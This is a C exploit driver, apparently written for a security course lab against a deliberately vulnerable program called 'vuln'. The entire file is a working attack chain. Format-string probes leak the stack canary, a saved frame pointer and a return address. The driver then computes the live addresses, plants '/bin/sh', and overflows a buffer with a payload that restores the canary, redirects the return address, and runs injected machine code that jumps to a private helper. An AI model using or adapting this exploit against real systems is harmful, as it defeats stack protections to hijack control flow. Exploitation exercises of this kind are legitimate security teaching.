#include "driver_base.c"

int main() {
    char *nargv[3];
    nargv[0] = "vuln";
    nargv[1] = STRINGIFY(GRP);
    nargv[2] = NULL;

    uint64_t auth_bp =         0x7ffca4e76e10; // rbp value in auth
    uint64_t auth_cred_loc =   0x7ffca4e76e00; // loc of cred
    uint64_t auth_db_loc =     0x7ffca4e76df8; // loc of db (local var of auth)
    uint64_t auth_cred =   0x7ffca4e76d10; // value of cred (after alloca)
    uint64_t main_bp =       0x7ffca4e77550; // saved rbp value in mainloop
    uint64_t main_loop_return_addr = 0x5613287a3ea9; // return address on the stack inside main loop
    uint64_t private_helper_addr = 0x5613287a3f3a; // TODO

    uint64_t auth_bp_cred_loc_dist = auth_cred_loc - auth_bp;
    uint64_t auth_bp_cred_dist = auth_cred - auth_bp;
    uint64_t auth_db_cred_dist = auth_db_loc - auth_cred;

    uint64_t auth_main_bp_dist = auth_bp - main_bp;
    uint64_t private_helper_distance = private_helper_addr - main_loop_return_addr;

    create_subproc("./vuln", nargv);
    fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
            "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
            "to continue with the exploit\n");

    getchar();
    get_formatted("%*s"); //Needed to clear out the Welcome message

    put_str("e %217$p\n");
    send();
    uint64_t stack_canary;
    get_formatted("%p", &stack_canary);
    fprintf(stderr, "driver: Extracted stack_canary=%lx\n", stack_canary);

    put_str("e %218$p\n");
    send();
    uint64_t cur_main_bp;
    get_formatted("%p", &cur_main_bp);
    fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

    put_str("e %219$p\n");
    send();
    uint64_t curr_main_loop_return_addr;
    get_formatted("%p", &curr_main_loop_return_addr);
    fprintf(stderr, "driver: Extracted curr_main_loop_return_addr=%lx\n", curr_main_loop_return_addr);


    // Compute the information for the current run using the probed values
    uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
    uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
    uint64_t curr_auth_cred = cur_auth_bp + auth_bp_cred_dist;

    uint64_t curr_private_helper_addr = curr_main_loop_return_addr + private_helper_distance;
    
    fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_auth_cred_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
            cur_auth_bp, cur_auth_cred_loc, curr_auth_cred, curr_private_helper_addr);

    // Now, send the payload
    put_str("p /bin/sh\n");
    send();
    get_formatted("%*s");

    unsigned explsz = auth_db_cred_dist + 8 - 8 + (4*8) + 8;
    void* *expl = (void**)malloc(explsz);
    memset((void*)expl, 0x90, explsz);

    expl[explsz/sizeof(void*)-1] = (void*)0x68732f6e69622f;
    expl[explsz/sizeof(void*)-2] = (void*)curr_auth_cred + 12; // return address
    expl[explsz/sizeof(void*)-3] = (void*)cur_auth_bp; // saved rbp value
    expl[explsz/sizeof(void*)-4] = (void*)stack_canary; // canary
    expl[explsz/sizeof(void*)-5] = (void*)curr_auth_cred; // cred
    expl[explsz/sizeof(void*)-6] = (void*)cur_auth_cred_loc; // db


    uint64_t injected_code[64] = {
        0xbf, 0x70, 0x56, 0x34, 0x12, 0x90, 0x90, 0x90, // mov    $0x12345670,%edi
        0x48, 0xbe, 0xf0, 0xde, 0xbc, 0x9a, 0x78, 0x56, // movabs $0x123456789abcdef0,%rsi
        0x34, 0x12, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x48, 0xba, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, // movabs <cred addr>,%rdx
        0x01, 0x01, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
        0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
    };
    int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);

    for (int i = 0; i < 8; i++) {
        uint8_t byte = ((cur_auth_bp + 0x10) >> (i * 8)) & 0xFF;
        injected_code[i+26] = byte;
    }

    for (int i = 0; i < 8; i++) {
        uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
        injected_code[i+42] = byte;
    }

    int curr_expl_location = 0;
    int shift_bytes = 0;
    for(int i = 0; i < injected_code_size; i++) {
        if(i % 8 == 0) {
            curr_expl_location++;
            expl[curr_expl_location] = 0x0000000000000000;
            shift_bytes = 0;
        }
        expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
        shift_bytes++;
    }

    put_str("u ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
    get_formatted("%*s");
    put_str("l \n");
    send();

    usleep(100000);
    get_formatted("%*s");

    kill(pid, SIGINT);

    int status;
    wait(&status);

    if (WIFEXITED(status)) {
        fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
    } 
    else if (WIFSIGNALED(status)) {
        printf("vuln killed by signal %d\n", WTERMSIG(status));
    } 
    else if (WIFSTOPPED(status)) {
        printf("vuln stopped by signal %d\n", WSTOPSIG(status));
    } 
    else if (WIFCONTINUED(status)) {
        printf("vuln continued\n");
    }
    
    

    /*
     Disassembly of section .text:

0000000000401000 <_start>:
  401000:	90                   	nop
  401001:	90                   	nop
  401002:	90                   	nop
  401003:	90                   	nop
  401004:	90                   	nop
  401005:	bf 70 56 34 12       	mov    $0x12345670,%edi
  40100a:	48 be f0 de bc 9a 78 	movabs $0x123456789abcdef0,%rsi
  401011:	56 34 12 
  401014:	48 ba 00 e0 ff ff ff 	movabs $0x7fffffffe000,%rdx
  40101b:	7f 00 00 
  40101e:	48 b8 ef be ad de ef be ad de       	mov    $0xdeadbeef,%eax
  401023:	ff e0                	jmpq   *%rax



        48 b8 a6 8f 3b dd 66 55 
        00 00 ff e0
      */

}

/*


      <return addr - cred>
rbp   <g's rbp> 
      canary (stack canary)
      cred addr
      db


   
                NOP
                NOP
      cred -> /bin/sh

*/

